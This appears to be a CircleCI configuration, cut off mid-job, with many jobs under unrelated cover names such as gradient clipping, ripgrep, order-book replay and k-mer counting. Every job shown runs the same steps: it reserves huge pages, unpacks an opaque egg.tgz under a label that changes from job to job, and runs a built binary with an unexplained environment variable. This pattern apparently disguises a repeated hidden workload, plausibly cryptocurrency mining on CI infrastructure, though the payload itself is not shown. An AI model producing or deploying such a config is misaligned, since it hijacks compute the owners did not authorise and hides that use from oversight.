version: 2.1

jobs:
  gradclip-norm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set clip
          command: |
            printf 'maxnorm 1.0\n' > clip.cfg
      - run:
          name: Build optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gradclip-norm -j2
      - run:
          name: Clip gradient norm
          command: LIONSS_LP=1 ./build/gradclip-norm --conf clip.cfg --p 2
  ripgrep_glob:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed tree
          command: |
            mkdir -p rg && printf 'needle\n' > rg/a.txt
      - run:
          name: Build search tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ripgrep_glob -j2
      - run:
          name: Glob-filtered grep
          command: LIONSS_LP=1 ./build/ripgrep_glob --type txt --pattern needle rg
  orderbook_replay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Fetch tick snapshot
          command: |
            printf 'ts,px,qty\n0,100,5\n' > ticks.csv
      - run:
          name: Build matching engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target orderbook_replay -j2
      - run:
          name: Replay order book
          command: LIONSS_LP=1 ./build/orderbook_replay --ticks ticks.csv --venue sim
  Fenwick:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed array
          command: |
            printf 'n 1024\n' > bit.cfg
      - run:
          name: Build index tree
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Fenwick -j2
      - run:
          name: Query fenwick sums
          command: LIONSS_LP=1 ./build/Fenwick --config bit.cfg --ops 100000
  hashAgg:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed groups
          command: |
            printf 'k,v\na,1\nb,2\n' > agg.csv
      - run:
          name: Build aggregator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hashAgg -j2
      - run:
          name: Hash-aggregate groups
          command: LIONSS_LP=1 ./build/hashAgg --in agg.csv --by k
  kotlin-inline:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write source
          command: |
            printf 'inline fun f(){}\n' > m.kt
      - run:
          name: Build inliner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kotlin-inline -j2
      - run:
          name: Inline lambda calls
          command: LIONSS_LP=1 ./build/kotlin-inline --in m.kt
  peak-macs2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load tags
          command: |
            : > tags.bed
      - run:
          name: Build peak caller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target peak-macs2 -j2
      - run:
          name: Call enrichment peaks
          command: LIONSS_LP=1 ./build/peak-macs2 --tags tags.bed --qvalue 0.05
  kmer-count31:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write reads
          command: |
            printf '>r1\nACGTACGTACGTACGTACGTACGTACGTACG\n' > reads.fa
      - run:
          name: Build counter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kmer-count31 -j2
      - run:
          name: Count 31-mers
          command: LIONSS_LP=1 ./build/kmer-count31 --reads reads.fa --k 31
  cnv-segment:
    machine:
